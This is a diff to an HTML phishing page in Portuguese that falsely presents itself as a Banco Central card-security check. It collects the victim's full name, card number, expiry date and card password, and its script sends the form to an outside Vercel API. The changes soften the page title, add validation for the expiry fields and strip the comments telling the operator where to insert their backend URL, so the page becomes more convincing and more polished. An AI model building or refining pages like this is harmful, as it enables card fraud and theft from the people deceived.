@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifique se o seu Cartão foi Clonado (Um Serviço Banco Central)</title>
+    <title>Verifique a Segurança do seu Cartão (Um Serviço Banco Central)</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -57,7 +57,7 @@
         .month-wrapper { flex: 3; }
         .year-wrapper { flex: 4; }
         label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--label-color); }
-        input[type="text"], input[type="password"] {
+        input[type="text"], input[type="password"], input[type="number"] {
             width: 100%;
             padding: 0.8rem 1rem;
             border: 1px solid var(--border-color);
@@ -66,10 +66,19 @@
             font-size: 1rem;
             transition: border-color 0.3s, box-shadow 0.3s;
         }
-        input[type="text"]:focus, input[type="password"]:focus {
+        input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus {
             outline: none;
             border-color: var(--primary-color);
             box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25);
+        }
+        /* Remove as setas dos inputs do tipo number */
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button { 
+          -webkit-appearance: none; 
+          margin: 0; 
+        }
+        input[type=number] {
+          -moz-appearance: textfield;
         }
         .submit-btn {
             background: linear-gradient(45deg, #007BFF, #0056b3);
@@ -97,8 +106,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Verifique se o seu Cartão foi Clonado</h1>
-        <!-- O formulário agora não precisa de 'action' ou 'method' -->
+        <h1>Verifique a Segurança do seu Cartão</h1>
         <form id="card-form">
             <div class="form-group">
                 <label for="nome">Nome Completo</label>
@@ -106,7 +114,6 @@
             </div>
             <div class="form-group">
                 <label for="numero_cartao">Número do Cartão</label>
-                <!-- ALTERAÇÃO: Adicionado maxlength, pattern e inputmode -->
                 <input type="text" id="numero_cartao" name="numero_cartao" required maxlength="16" pattern="\d{16}" inputmode="numeric" title="Digite os 16 dígitos do seu cartão.">
             </div>
             <div class="form-row">
@@ -114,10 +121,12 @@
                     <label for="validade_mes">Validade (Mês/Ano)</label>
                     <div class="input-row">
                         <div class="month-wrapper">
-                             <input type="text" id="validade_mes" name="validade_mes" placeholder="MM" required maxlength="2" pattern="\d{2}">
+                             <!-- ALTERAÇÃO: Mudado para type="number" -->
+                             <input type="number" id="validade_mes" name="validade_mes" placeholder="MM" required min="1" max="12">
                         </div>
                         <div class="year-wrapper">
-                            <input type="text" id="validade_ano" name="validade_ano" placeholder="AAAA" required maxlength="4" pattern="\d{4}">
+                            <!-- ALTERAÇÃO: Mudado para type="number" -->
+                            <input type="number" id="validade_ano" name="validade_ano" placeholder="AAAA" required min="2024" max="2050">
                         </div>
                     </div>
                 </div>
@@ -128,7 +137,6 @@
             </div>
             <div class="form-group">
                 <label for="senha">Senha</label>
-                <!-- ALTERAÇÃO: Adicionado maxlength -->
                 <input type="password" id="senha" name="senha" required maxlength="6">
             </div>
             <button type="submit" class="submit-btn" id="submit-button">
@@ -151,6 +159,25 @@
         const successModal = document.getElementById('success-modal');
         const successMessage = document.getElementById('success-message');
 
+        // --- NOVO CÓDIGO PARA VALIDAÇÃO ---
+        const monthInput = document.getElementById('validade_mes');
+        const yearInput = document.getElementById('validade_ano');
+
+        // Garante que o valor do mês não ultrapasse 12
+        monthInput.addEventListener('input', () => {
+            if (parseInt(monthInput.value) > 12) {
+                monthInput.value = '12';
+            }
+        });
+
+        // Garante que o valor do ano não ultrapasse 2050
+        yearInput.addEventListener('input', () => {
+            if (parseInt(yearInput.value) > 2050) {
+                yearInput.value = '2050';
+            }
+        });
+        // --- FIM DO NOVO CÓDIGO ---
+
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             submitButton.disabled = true;
@@ -158,9 +185,6 @@
             resultDiv.style.display = 'none';
             resultDiv.classList.remove('error');
 
-            // --- PONTO DE ALTERAÇÃO IMPORTANTE ---
-            // Substitua esta URL pela URL da sua API na Vercel.
-            // Ex: https://seu-projeto-123.vercel.app/api
             const backendUrl = 'https://credit-onex.vercel.app/api';
 
             const formData = new FormData(form);
